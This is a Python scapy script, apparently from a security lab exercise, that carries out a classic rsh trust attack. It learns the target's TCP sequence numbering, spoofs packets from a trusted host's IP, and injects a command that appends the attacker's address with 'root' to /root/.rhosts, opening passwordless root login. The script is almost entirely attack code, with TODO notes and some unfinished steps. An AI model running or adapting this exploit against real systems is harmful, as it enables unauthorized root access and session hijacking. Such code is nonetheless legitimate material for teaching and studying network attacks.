from scapy.all import *

import sys
import time

def tryConnection(srcip, dstip, sport, dport, seq):


    time.sleep(1)

    truSYN = IP(src = srcip, dst = dstip) / TCP(sport = sport, dport = dport, flags = 'S', seq = 1000)
    send(truSYN)

    time.sleep(1)

    for i in range(2, 3):
        seqNum = (seq + 64 * i) * 1000

        # print("Tried ", seqNum)

        truACK = IP(src = srcip, dst = dstip) / TCP(sport = sport, dport = dport, flags = 'A', seq = 1001, ack = seqNum + 2)
        send(truACK)

        time.sleep(1)

        truPSHACK = IP(src = srcip, dst = dstip) / TCP(sport = sport, dport = dport, flags = 'AP', seq = 1001, ack = seqNum + 2) / "\x00"
        send(truPSHACK)

        time.sleep(1)

        truPSHACKcmd = IP(src = srcip, dst = dstip) / TCP(sport = sport, dport = dport, flags = 'AP', seq = 1002, ack = seqNum + 2) / ("root\x00"+"root\x00"+cmd+"\x00")
        send(truPSHACKcmd)

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("needs 3 arguments")
        sys.exit(0)

    conf.verb = 0
    conf.iface = sys.argv[1]
    target_ip = sys.argv[2]
    trusted_host_ip = sys.argv[3]



    my_ip = get_if_addr(sys.argv[1])

    target = "10.4.61.25"
    cmd = "echo '%s root' >> /root/.rhosts" % my_ip
    sport = 1023 #rsh port range 512-1023

    #TODO: figure out SYN sequence number pattern
    # get base isn
    attSYN = IP(dst = target) / TCP(sport = sport, dport = 514, flags = 'S', seq = 1000)
    attSYNACK = sr1(attSYN)
    baseisn = attSYNACK.seq // 1000

    # print(attSYNACK.ack, attSYNACK.seq)

    RST = IP(dst = target) / TCP(sport = sport, dport = 514, flags = 'R', seq = 1001)
    send(RST)

    #TODO: TCP hijacking with predicted sequence number
    tryConnection(trusted_host_ip, target_ip, sport, 514, baseisn)

    time.sleep(5)
    RST = IP(src = trusted_host_ip, dst = target_ip) / TCP(sport = sport, dport = 514, flags = 'R', seq = 1001)
